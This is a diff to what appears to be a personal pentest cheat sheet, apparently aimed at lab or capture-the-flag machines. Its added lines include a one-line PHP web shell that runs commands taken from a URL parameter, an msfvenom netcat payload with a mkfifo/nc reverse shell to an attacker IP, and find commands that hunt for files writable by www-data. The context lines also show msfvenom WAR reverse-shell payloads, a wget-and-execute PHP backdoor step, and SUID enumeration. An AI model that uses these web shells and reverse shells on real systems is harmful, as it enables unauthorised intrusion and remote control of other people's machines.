@@ -726,6 +726,9 @@ pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run 
 
 ```bash
 
+find / '(' -type f -or -type d ')' '(' '(' -user www-data ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | sort | uniq
+find / '(' -type f -or -type d ')' -group www-data -perm -g=w 2>/dev/null| grep -v '/proc/' | sort | uniq
+
 find / -perm -u=s -type f  2>/dev/null | xargs ls -l
 find / -perm -g=s -type f 2>/dev/null| xargs ls -l
 
@@ -798,6 +801,8 @@ find / -type f -name user.txt -exec cat {} \; 2> /dev/null
     
     # PHP reverse shell via interactive console
     wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
+
+    <?php passthru($_GET['lqIdA5']);?>
 
     # socat
     # attacker
@@ -918,6 +923,7 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     #Payload options (linux/x86/meterpreter/reverse_tcp):
 
     #Tomcat
+
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
     msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
 
@@ -1558,6 +1564,9 @@ https://github.com/rebootuser
     msf6 exploit(multi/handler) > run
 
 
+
+    $ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.1 lport=8888  R
+    mkfifo /tmp/vvvhm; nc 192.168.56.1 8888 0</tmp/vvvhm | /bin/sh >/tmp/vvvhm 2>&1; rm /tmp/vvvhm
 
 
 # Escape jail
